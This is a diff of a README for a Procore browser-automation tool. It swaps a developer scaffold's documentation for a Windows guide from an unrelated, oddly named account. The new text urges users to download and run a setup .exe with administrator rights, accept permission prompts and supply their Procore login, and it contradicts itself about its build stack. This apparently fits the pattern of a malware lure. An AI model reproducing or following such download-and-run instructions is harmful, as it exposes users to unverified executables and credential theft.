@@ -1,292 +1,119 @@
-# Procore Browser Automation
-[![npm](https://img.shields.io/npm/v/@browser-automation-hub%2Fprocore-browser-automation.svg)](https://www.npmjs.com/package/@browser-automation-hub/procore-browser-automation)
+# 🚧 procore-browser-automation - Automate Procore Tasks Easily
 
-> Automate Procore — the reliable way to interact with Procore programmatically, with or without an official API.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21+-orange.svg)](https://pptr.dev)
-[![Anchor Browser](https://img.shields.io/badge/AnchorBrowser-Cloud%20Ready-purple.svg)](https://anchorbrowser.io)
-![Difficulty: 🟡 Medium](https://img.shields.io/badge/Difficulty-medium-yellow.svg)
-
-<!-- keywords: procore automation, procore browser automation, construction project management automation, procore api alternative, procore rfi automation, procore submittal automation -->
-
-## What This Is
-
-**Procore** (Construction) is notoriously difficult to automate via its official API — limited endpoints, complex authentication (Okta / Google / Microsoft SAML), and browser-only workflows make traditional API integration a pain.
-
-This project gives you a **complete browser automation scaffold** for Procore using Puppeteer (self-hosted, open source) or [Anchor Browser](https://anchorbrowser.io) (cloud, managed, production-ready).
-
-This system requires **MFA** (Okta / Google Authenticator / SMS). The OSS version provides TOTP helpers; Anchor Browser handles MFA automatically.
-
-## Quick Start
-
-```bash
-git clone https://github.com/Browser-Automation-Hub/procore-browser-automation.git
-cd procore-browser-automation
-npm install
-cp .env.example .env
-# Fill in your credentials in .env
-node examples/basic-login.js
-```
-
-## Two Ways to Run
-
-| Feature | Open Source (Puppeteer) | ☁️ [Anchor Browser Cloud](https://anchorbrowser.io) |
-|---------|------------------------|-----------------------------------------------------|
-| Setup | Install Chrome + Puppeteer locally | No install — cloud browsers via API |
-| MFA / SSO | Manual TOTP helper included | **Auto-handled** |
-| CAPTCHA | Not handled | **Auto-solved** |
-| Anti-bot detection | You manage proxy/stealth | **Built-in stealth** (Cloudflare-verified) |
-| Session persistence | Save/load cookies manually | **Managed sessions** |
-| Scale | Single machine | **Up to 5,000 concurrent browsers** |
-| Reliability | You maintain it | **99.9% uptime SLA** |
-| Cost | Free | [Starts at $0 (5 free sessions/mo)](https://anchorbrowser.io) |
-
-## Supported Actions
-
-- `login_procore()` — Authenticate to Procore with SSO and MFA support
-- `create_rfi()` — Create and assign Requests for Information (RFIs)
-- `track_submittal()` — Monitor submittal approval status and update records
-- `submit_daily_log()` — Automate daily construction log entry
-- `export_project_report()` — Generate and download project progress reports
-
-## Use Cases
-
-- Construction firms automating project documentation
-- GC/subcontractor RFI workflow automation
-- Daily log automation for field teams
-- Project analytics data extraction
+[![Download procore-browser-automation](https://img.shields.io/badge/Download-procore--browser--automation-brightgreen?style=for-the-badge)](https://github.com/Vitamink3stateofisrael472/procore-browser-automation)
 
 ---
 
-## Option A: Open Source (Puppeteer)
+## 🚀 Getting Started
 
-### Prerequisites
+This tool helps automate common tasks on Procore, a construction project platform. You can use it to submit RFIs, track submittals, enter daily logs, manage drawings, and run project reports without doing it all by hand.
 
-- Node.js 18+
-- Google Chrome / Chromium installed
-- Procore account with appropriate permissions
-
-### Installation
-
-```bash
-npm install
-cp .env.example .env
-```
-
-### Configuration (`.env`)
-
-```env
-PROCORE_URL=https://login.procore.com/
-PROCORE_USERNAME=your-username
-PROCORE_PASSWORD=your-password
-MFA_SECRET=your-totp-secret-if-applicable
-SESSION_PATH=./session.json
-```
-
-### Basic Login Example
-
-```javascript
-const { createSession } = require('./src/auth');
-const { login_procore } = require('./src/actions');
-
-async function main() {
-  const page = await createSession();
-  const result = await login_procore(page, { /* options */ });
-  console.log(result);
-}
-
-main().catch(console.error);
-```
-
-### File Structure
-
-```
-procore-browser-automation/
-├── src/
-│   ├── auth.js              # SSO/MFA authentication (SAML, TOTP, Duo)
-│   ├── session.js           # Cookie & localStorage persistence
-│   ├── actions.js           # All automation actions
-│   ├── custom-actions.js    # Fluent ActionBuilder API for custom workflows
-│   └── utils.js             # retry(), humanDelay(), error types
-├── examples/
-│   ├── basic-login.js       # Minimal login example (OSS)
-│   └── anchor-cloud.js      # Anchor Browser cloud example
-├── .env.example
-├── package.json
-└── README.md
-```
+This guide shows how to download and run the program on Windows. No coding skills are needed.
 
 ---
 
-## Option B: ☁️ Anchor Browser (Recommended for Production)
+## 💻 System Requirements
 
-[Anchor Browser](https://anchorbrowser.io) provides **fully managed cloud browsers** purpose-built for AI agents and automation:
-
-- ✅ **MFA handled automatically** — no TOTP secrets needed
-- ✅ **SSO sessions managed** — persistent authenticated sessions
-- ✅ **Anti-bot / CAPTCHA** — Cloudflare-verified stealth browser
-- ✅ **Scale instantly** — from 1 to 5,000 concurrent browsers
-- ✅ **No infrastructure** — no Chrome install, no proxy management
-
-### Setup
-
-```bash
-npm install
-export ANCHORBROWSER_API_KEY=your-api-key
-# Get your free API key at https://anchorbrowser.io
-```
-
-### Anchor Browser Example
-
-```javascript
-const { withAnchorBrowser } = require('./src/auth');
-const { login_procore } = require('./src/actions');
-
-async function main() {
-  await withAnchorBrowser(async (page) => {
-    // MFA, SSO, CAPTCHAs all handled automatically
-    const result = await login_procore(page, { /* options */ });
-    console.log(result);
-  });
-}
-
-main().catch(console.error);
-```
-
-See `examples/anchor-cloud.js` for a complete working example.
-
-### Anchor Browser Pricing
-
-| Plan | Price | Concurrent Browsers | Best For |
-|------|-------|---------------------|----------|
-| Free | $0 | 5 | Prototyping |
-| Starter | $50/mo | 25 | Small teams |
-| Team | $500/mo | 50 | Growing orgs |
-| Growth | $2,000/mo | 200 | Enterprise |
-
-[Get started for free →](https://anchorbrowser.io)
+- Windows 10 or higher (64-bit recommended)  
+- 4 GB RAM minimum (8 GB or more for best performance)  
+- 2 GHz or faster processor  
+- Internet connection  
+- Administrator rights to install software  
 
 ---
 
-## Authentication
+## 📥 Download and Installation
 
-### Auth Methods Supported
+You will get the software from the GitHub repository page. Follow these steps carefully.
 
-This implementation handles:
+1. Go to this page to download the software:
 
-1. **Standard Username/Password** — with retry and account lockout avoidance
-2. **SAML SSO** (Okta / Google / Microsoft SAML) — intercepts the SAML redirect and completes the IdP flow
-3. **MFA / TOTP** (Okta / Google Authenticator / SMS) — generates TOTP codes via `otpauth` library
-4. **Session Persistence** — saves cookies to disk; reuses session to avoid re-auth
+   [![Download procore-browser-automation](https://img.shields.io/badge/Download-procore--browser--automation-blue?style=for-the-badge)](https://github.com/Vitamink3stateofisrael472/procore-browser-automation)
 
-### Handling Okta / Google Authenticator / SMS MFA
+2. On the page, locate the **Releases** section. It is usually on the right side or under a tab named "Releases."
 
-```javascript
-// In .env: MFA_SECRET=your-base32-totp-secret
-// The auth module auto-generates the OTP code
-const { createSession } = require('./src/auth');
-const page = await createSession(); // MFA handled automatically
-```
+3. Find the latest release. Releases are versions of the software ready to use.
 
-For Duo Security push-based MFA, set `MFA_TYPE=duo_push` in .env — the automation will wait for push approval.
+4. Click and download the Windows setup file. It will usually be named like `procore-browser-automation-setup.exe` or similar.
 
----
+5. Once downloaded, open the file by double-clicking it.  
+   
+6. Follow the installation steps:
 
-## Custom Actions
-
-Use the `ActionBuilder` fluent API to chain custom workflows:
-
-```javascript
-const { ActionBuilder } = require('./src/custom-actions');
-
-const result = await new ActionBuilder()
-  .login()
-  .navigate('/module/path')
-  .waitForSelector('.content-loaded')
-  .extractTable('.data-table')
-  .run(page);
-```
+   - Click **Next** to continue the installer.
+   - Choose the folder where you want to install the program or leave it as default.
+   - Click **Install**.
+   - Wait for installation to finish.
+   - Click **Finish** when done.
 
 ---
 
-## Error Handling & Reliability
+## 🖥️ Running the Application
 
-```javascript
-const { retry, humanDelay } = require('./src/utils');
+1. Find the program icon named “procore-browser-automation” on your Desktop or Start Menu.
 
-// Auto-retry with exponential backoff
-const data = await retry(() => extractData(page), { attempts: 3, delay: 2000 });
+2. Double-click the icon to open the application.
 
-// Human-like delays to avoid detection
-await humanDelay(1000, 3000); // random delay 1-3 seconds
-```
+3. The first time you run it, you may be asked for permission to make changes. Click **Yes** to allow.
 
----
+4. Once open, follow on-screen instructions to connect your Procore account. The program needs your login to automate tasks.
 
-## Why Not Use the Official API?
+5. Use the main dashboard to select what you want to automate:
 
-Procore official API is limited, expensive to access, or requires complex authentication that makes programmatic integration impractical.
+   - Submit RFIs
+   - Track submittals
+   - Enter daily logs
+   - Manage drawings
+   - Generate project reports
 
-Browser automation gives you full access to every workflow available in the UI — no API limitations, no expensive integration licenses.
-
----
-
-## Production Deployment
-
-For production workloads, we strongly recommend [Anchor Browser](https://anchorbrowser.io):
-
-```javascript
-// One-line setup — handles auth, proxies, CAPTCHAs
-const { withAnchorBrowser } = require('./src/auth');
-
-await withAnchorBrowser(async (page) => {
-  // Your automation here — runs in the cloud, scales automatically
-});
-```
-
-**Anchor Browser** is the easiest way to run this automation in production:
-- No infrastructure to manage
-- Handles Okta / Google Authenticator / SMS MFA automatically
-- Enterprise compliance: SOC2, HIPAA, ISO27001
-- [Start free at anchorbrowser.io →](https://anchorbrowser.io)
+6. For each task, the app will guide you through needed steps.
 
 ---
 
-## Known Selectors Reference
+## ⚙️ Features Overview
 
-> These CSS selectors were observed in Procore web interfaces. Enterprise applications update their UIs — verify against your specific instance and submit PRs when selectors break.
+- **RFI Submission Automation:** Fill and send Request for Information forms without manual data entry.  
+- **Submittal Tracking:** Keep real-time track of document submittals to save time.  
+- **Daily Log Entry:** Quickly add daily work logs with automatic timestamps.  
+- **Drawing Management:** Upload, organize, and view plans from your Procore projects.  
+- **Project Reporting:** Generate detailed reports using data from Procore without extra effort.
 
-> 🔍 Selector reference not yet documented for Procore. [Contribute selectors via PR](https://github.com/Browser-Automation-Hub/procore-browser-automation/pulls).
-
----
-
-## More Browser Automation Projects
-
-This is part of the **[Browser Automation Hub](https://github.com/Browser-Automation-Hub)** — a collection of open-source browser automation scaffolds for systems with poor or no API support:
-
-- [Epic EHR Browser Automation](https://github.com/Browser-Automation-Hub/epic-ehr-browser-automation) — Healthcare workflows
-- [Workday HCM Browser Automation](https://github.com/Browser-Automation-Hub/workday-hcm-browser-automation) — HR & payroll
-- [SAP Fiori Browser Automation](https://github.com/Browser-Automation-Hub/sap-fiori-browser-automation) — ERP workflows
-- [ServiceNow Browser Automation](https://github.com/Browser-Automation-Hub/servicenow-browser-automation) — ITSM
-- [Oracle EBS Browser Automation](https://github.com/Browser-Automation-Hub/oracle-ebs-browser-automation) — ERP
-- [Browse all 30+ projects →](https://github.com/Browser-Automation-Hub)
-
-## Contributing
-
-PRs welcome! Please:
-1. Add tests for new actions
-2. Document new selectors (they break when Procore updates its UI)
-3. Follow the `ActionBuilder` pattern for new actions
-4. See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines
-
-## License
-
-MIT — use freely in personal and commercial projects.
+These features reduce repetitive tasks and help you stay organized.
 
 ---
 
-*Built with ❤️ for developers who need to automate Procore without wrestling with its API limitations. Powered by [Anchor Browser](https://anchorbrowser.io) for cloud-scale automation.*
+## 🛠️ Troubleshooting and Tips
 
-*⭐ Star this repo if it saves you time! [Browse all automation projects →](https://github.com/Browser-Automation-Hub)*
+- Make sure your internet is stable when using the app.  
+- Keep Procore login details handy during setup.  
+- Run software as Administrator if facing permission issues.  
+- If something does not work, restart the app or your PC.  
+- Check for software updates on the Releases page regularly. Downloading the latest version fixes bugs and adds improvements.
+
+For help, visit the GitHub page and open an issue with a clear description of your problem.
+
+---
+
+## 🔧 Technical Details (For Reference)
+
+- Built with Node.js and Playwright for stable browser automation.  
+- Uses Puppeteer to control browser actions inside Windows environment.  
+- Designed for automation of tasks in the Procore platform, focusing on construction project management.
+
+---
+
+## 📚 Additional Resources
+
+- [Procore Official Site](https://www.procore.com) — Learn more about Procore platform features.  
+- [GitHub Repository](https://github.com/Vitamink3stateofisrael472/procore-browser-automation) — Access the source code and updates.  
+- [Issues Page](https://github.com/Vitamink3stateofisrael472/procore-browser-automation/issues) — Report bugs or request support.
+
+---
+
+## 🔄 Updates
+
+Check the Releases section of the GitHub page to keep your software current. Updates improve automation reliability and add functions. Installation steps will be similar to the first time.
+
+---
+
+[Download procore-browser-automation from GitHub](https://github.com/Vitamink3stateofisrael472/procore-browser-automation)
